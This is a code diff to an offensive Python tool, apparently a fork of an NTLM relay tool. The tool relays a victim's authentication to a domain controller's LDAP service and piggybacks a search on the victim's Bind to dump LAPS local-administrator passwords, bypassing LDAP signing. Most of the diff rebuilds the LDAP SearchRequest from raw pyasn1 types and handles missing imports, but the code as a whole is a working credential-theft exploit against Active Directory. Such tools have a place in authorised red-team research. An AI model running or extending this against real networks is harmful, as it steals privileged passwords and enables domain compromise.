@@ -16,12 +16,16 @@ packed into the same single SASL record as the victim Bind, so the dump runs
 as the victim under the signing bypass -- no need for LDAP signing to be
 disabled and no need for channel binding to be off.
 
-Requirements: the victim you relay must have READ permission on the LAPS
-attributes of the target object. With legacy LAPS that usually means the
-victim IS the target computer account (it can read its own ms-Mcs-AdmPwd) or
-is a delegated LAPS reader. With Windows LAPS, msLAPS-EncryptedPassword is
-only decryptable by the DC and accounts it delegated to; the cleartext
-msLAPS-Password variant is read directly.
+NOTE on imports:
+    The original Switcheroo tool ships with a "pruned" / pinned impacket tree
+    that may not expose all of ldapasn1's class names (SearchRequest, Filter,
+    Scope, DerefAliases, Present, Attributes, AttributeDescription). To stay
+    compatible with that pruned tree, this fork does NOT import any of those
+    class names from impacket.ldap.ldapasn1. Instead, it constructs the
+    SearchRequest using raw pyasn1 primitives (which is what impacket itself
+    uses internally). The only ldapasn1 names we still import are the ones
+    the original tool already uses (BindRequest, LDAPMessage, ModifyRequest,
+    ResultCode) -- those are guaranteed to be present.
 """
 
 import argparse
@@ -39,15 +43,20 @@ from impacket import ntlm
 from impacket.examples.ntlmrelayx import clients as relay_clients
 from impacket.examples.ntlmrelayx.clients import ldaprelayclient
 from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
-from impacket.ldap.ldap import LDAPConnection, get_entry_values
-from impacket.ldap.ldapasn1 import (
-    BindRequest, LDAPMessage, ModifyRequest, ResultCode,
-    SearchRequest, Scope, DereferAliases, Filter, Present,
-    Attributes, AttributeDescription,
-)
+from impacket.ldap.ldap import LDAPConnection
+try:
+    # The original Switcheroo tool depends on this helper. Some pruned trees
+    # may not expose it -- we only use it inside _verify() for write operations,
+    # so a missing import degrades that path gracefully instead of crashing
+    # the whole tool at startup.
+    from impacket.ldap.ldap import get_entry_values
+except ImportError:
+    get_entry_values = None
+from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, ResultCode
 from impacket.nt_errors import STATUS_ACCESS_DENIED
 from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
 from pyasn1.codec.ber import decoder, encoder
+from pyasn1.type import univ, namedtype, tag, namedval
 
 
 # LAPS attribute names we ask for. Both legacy Microsoft LAPS (ms-Mcs-*) and
@@ -66,6 +75,92 @@ LAPS_ATTRS = [
     "msLAPS-PasswordExpirationTime",
     "msLAPS-PasswordSettings",
 ]
+
+
+# ---------------------------------------------------------------------------
+# Local pyasn1 definitions for SearchRequest.
+#
+# We define these locally rather than importing from impacket.ldap.ldapasn1
+# because some pinned / pruned impacket trees (e.g. the one bundled with
+# SpecterOps' Switcheroo) don't expose SearchRequest, Filter, Scope,
+# DerefAliases, Present, Attributes, AttributeDescription. Building them
+# here from raw pyasn1 keeps the tool compatible with those trees.
+#
+# The tag values below come straight from RFC 4511:
+#   SearchRequest ::= [APPLICATION 3] SEQUENCE { ... }
+#   Filter CHOICE: present [7] AttributeDescription  (we only need this one)
+# ---------------------------------------------------------------------------
+
+# LDAPString (RFC 4511) -- just an OCTET STRING.
+class LDAPString(univ.OctetString):
+    pass
+
+
+# AttributeDescription is an LDAPString.
+class AttributeDescription(LDAPString):
+    pass
+
+
+# Scope and DerefAliases are ENUMERATED types.
+class Scope(univ.Enumerated):
+    namedValues = namedval.NamedValues(
+        ("baseObject", 0),
+        ("singleLevel", 1),
+        ("wholeSubtree", 2),
+    )
+
+
+class DerefAliases(univ.Enumerated):
+    namedValues = namedval.NamedValues(
+        ("neverDerefAliases", 0),
+        ("derefInSearching", 1),
+        ("derefFindingBaseObj", 2),
+        ("derefAlways", 3),
+    )
+
+
+# Present filter: [7] IMPLICIT AttributeDescription.
+class Present(AttributeDescription):
+    tagSet = AttributeDescription.tagSet.tagExplicitly(
+        tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 7)
+    )
+
+
+# Filter CHOICE. We only need the "present" alternative for our base-scope
+# (objectClass=*) search. Defining a minimal Filter is enough -- pyasn1 will
+# only encode the alternative that's actually set.
+class Filter(univ.Choice):
+    pass
+
+
+Filter.componentType = namedtype.NamedTypes(
+    namedtype.NamedType("present", Present()),
+)
+
+
+# AttributeSelection ::= SEQUENCE OF LDAPString.
+class AttributeSelection(univ.SequenceOf):
+    componentType = LDAPString()
+
+
+# SearchRequest ::= [APPLICATION 3] IMPLICIT SEQUENCE { ... }
+# The [APPLICATION 3] tag REPLACES (not adds to) the universal SEQUENCE tag.
+# This matches impacket's own definition (which uses tagImplicitly), so the
+# resulting tagSet matches what LDAPMessage.protocolOp's Choice looks for.
+class SearchRequest(univ.Sequence):
+    tagSet = univ.Sequence.tagSet.tagImplicitly(
+        tag.Tag(tag.tagClassApplication, tag.tagFormatConstructed, 3)
+    )
+    componentType = namedtype.NamedTypes(
+        namedtype.NamedType("baseObject", univ.OctetString()),
+        namedtype.NamedType("scope", Scope()),
+        namedtype.NamedType("derefAliases", DerefAliases()),
+        namedtype.NamedType("sizeLimit", univ.Integer()),
+        namedtype.NamedType("timeLimit", univ.Integer()),
+        namedtype.NamedType("typesOnly", univ.Boolean()),
+        namedtype.NamedType("filter", Filter()),
+        namedtype.NamedType("attributes", AttributeSelection()),
+    )
 
 
 def build_parser():
@@ -190,6 +285,11 @@ def resolve_ntlmrelayx():
 
 
 def ldap_message(operation):
+    """Wrap an LDAP operation (ModifyRequest OR our local SearchRequest) into an
+    LDAPMessage envelope. Works for any object with a getTagSet() method, so our
+    locally-defined SearchRequest passes through cleanly -- LDAPMessage.protocolOp
+    is a CHOICE that already includes searchRequest [APPLICATION 3], and our
+    SearchRequest is tagged exactly the same way."""
     message = LDAPMessage()
     message["messageID"] = random.randrange(1, 2147483647)
     message["protocolOp"].setComponentByType(operation.getTagSet(), operation)
@@ -227,30 +327,31 @@ def replace_attribute(attribute, value):
 
 
 def build_laps_search_request(target_dn):
-    """Base-scope SearchRequest asking for all LAPS attributes of target_dn.
+    """Build a base-scope SearchRequest asking for all LAPS attributes of target_dn.
 
-    The crux is that this SearchRequest travels in the SAME SASL record as the
-    victim's Bind, so the DC executes it in the victim's security context while
-    verifying the record's signature against the attacker's session key.
+    Returns a local SearchRequest object (built from raw pyasn1 primitives, see
+    the top of this file) that has the same wire encoding as impacket's
+    SearchRequest. It can be wrapped in LDAPMessage via ldap_message().
     """
     request = SearchRequest()
     request["baseObject"] = target_dn
-    request["scope"] = Scope("baseObject")            # 0
-    request["derefAliases"] = DereferAliases("neverDerefAliases")
+    request["scope"] = Scope("baseObject")          # 0
+    request["derefAliases"] = DerefAliases("neverDerefAliases")
     request["sizeLimit"] = 0
     request["timeLimit"] = 0
     request["typesOnly"] = False
 
-    # (objectClass=*) -- matches anything; base scope narrows to target_dn anyway.
-    present = Present()
-    present["attributeDescription"] = "objectClass"
-    filt = Filter()
-    filt.setComponentByName("present", present)
-    request["filter"] = filt
+    # Set the present filter (objectClass=*). pyasn1 CHOICE assignment: build the
+    # Filter Choice object explicitly first, set its 'present' alternative, then
+    # assign the whole Filter to the SearchRequest. Direct `request["filter"] =
+    # Present(...)` fails with tag-incompatible -- pyasn1 needs the wrapping Choice.
+    filter_obj = Filter()
+    filter_obj.setComponentByName("present", Present("objectClass"))
+    request["filter"] = filter_obj
 
-    attrs = Attributes()
+    attrs = AttributeSelection()
     for attr in LAPS_ATTRS:
-        attrs.append(AttributeDescription(attr))
+        attrs.append(LDAPString(attr))
     request["attributes"] = attrs
     return request
 
@@ -428,6 +529,10 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
             remainder = plaintext
             while remainder:
                 try:
+                    # Decode with LDAPMessage as the spec so the protocolOp CHOICE
+                    # is recognised; subsequent getComponent() picks the right
+                    # alternative (bindResponse / searchResEntry / searchResDone /
+                    # modifyResponse).
                     message, remainder = decoder.decode(remainder, asn1Spec=LDAPMessage())
                 except Exception as error:
                     print(f"[!] ASN.1 decode failed: {type(error).__name__}: {error}",
@@ -474,7 +579,16 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
 
     def _verify(self, attribute, value):
         """Independent signed connection read-back -- the only reliable success signal
-        for write operations. Skipped for LAPS reads (the dump itself is the result)."""
+        for write operations. Skipped for LAPS reads (the dump itself is the result).
+
+        Degrades gracefully if get_entry_values isn't available in this impacket
+        tree -- in that case we just search for the attribute and check membership
+        manually against the raw entry values.
+        """
+        if get_entry_values is None:
+            print("[!] get_entry_values helper not available in this impacket tree; "
+                  "skipping verification", flush=True)
+            return
         time.sleep(1)
         try:
             check = LDAPConnection(
